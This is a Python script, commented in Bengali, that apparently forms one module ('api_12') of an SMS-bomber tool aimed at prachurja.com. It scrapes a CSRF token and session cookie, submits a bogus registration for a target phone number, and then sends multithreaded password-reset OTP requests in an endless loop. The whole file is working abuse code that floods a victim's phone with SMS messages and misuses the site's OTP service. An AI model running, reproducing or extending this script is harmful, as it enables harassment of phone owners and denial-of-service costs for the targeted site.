import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# Total requests counter
total_requests = 0

def fetch_token_and_session():
    """
    CSRF টোকেন এবং সেশন সংগ্রহ করা।
    """
    url = "https://prachurja.com/register"
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')

    # CSRF টোকেন বের করা
    csrf_token = soup.find("meta", {"name": "csrf-token"})["content"]

    # সেশন কুকি বের করা
    cookies = response.headers.get("set-cookie")
    prachurja_session = None
    if cookies and "prachurja_session" in cookies:
        for cookie in cookies.split(";"):
            if "prachurja_session" in cookie:
                prachurja_session = cookie.split("=")[1].strip()

    if not csrf_token or not prachurja_session:
        raise Exception("Failed to retrieve CSRF token or session cookie.")

    return csrf_token, prachurja_session

def send_prachurja_request(csrf_token, prachurja_session, phone_number):
    """
    OTP রিকোয়েস্ট পাঠানো Prachurja API তে।
    """
    global total_requests
    url = "https://prachurja.com/forget-password"
    headers = {
        "Host": "prachurja.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": f"prachurja_session={prachurja_session}"
    }
    data = {
        "_token": csrf_token,
        "username": phone_number
    }

    try:
        response = requests.post(url, headers=headers, data=data)
        total_requests += 1
        if response.status_code == 200:
            print(f"[api_12] [{total_requests}] : OTP Sent Successfully!")
        else:
            print(f"[api_12] [{total_requests}] : Failed to send OTP. Status: {response.status_code}")
    except Exception as e:
        print(f"[api_12] Error: {e}")

def register_request(phone_number):
    """
    Register পৃষ্ঠায় GET রিকোয়েস্ট পাঠানো।
    """
    url = "https://prachurja.com/register"
    params = {
        "name": "Rahat",
        "mobile": phone_number,
        "password": "123456"
    }
    headers = {
        "Host": "prachurja.com",
        "Referer": "https://prachurja.com/register"
    }

    response = requests.get(url, headers=headers, params=params)
    if response.status_code == 200:
        print(f"Register Request Sent Successfully for {phone_number}")
    else:
        print(f"Register Request Failed with Status Code: {response.status_code}")

def main(mobile, threads):
    """
    মাল্টিথ্রেডিং ব্যবহার করে Prachurja API তে রিকোয়েস্ট পাঠানো।
    """
    global total_requests

    # মোবাইল নম্বর যাচাই করা
    if len(mobile) != 11 or not mobile.isdigit():
        print("Invalid phone number format. Please provide an 11-digit phone number.")
        return

    # Register রিকোয়েস্ট পাঠানো
    register_request(mobile)

    try:
        # CSRF টোকেন এবং সেশন সংগ্রহ করা
        csrf_token, prachurja_session = fetch_token_and_session()
        print("Token and session fetched successfully!")
    except Exception as e:
        print(e)
        return

    # মাল্টিথ্রেডিং দিয়ে OTP রিকোয়েস্ট পাঠানো
    with ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            futures = [executor.submit(send_prachurja_request, csrf_token, prachurja_session, mobile) for _ in range(threads)]
            for future in futures:
                future.result()

if __name__ == "__main__":
    mobile = input("Enter an 11-digit phone number: ")
    threads = int(input("Threads (1-50): "))
    main(mobile, threads)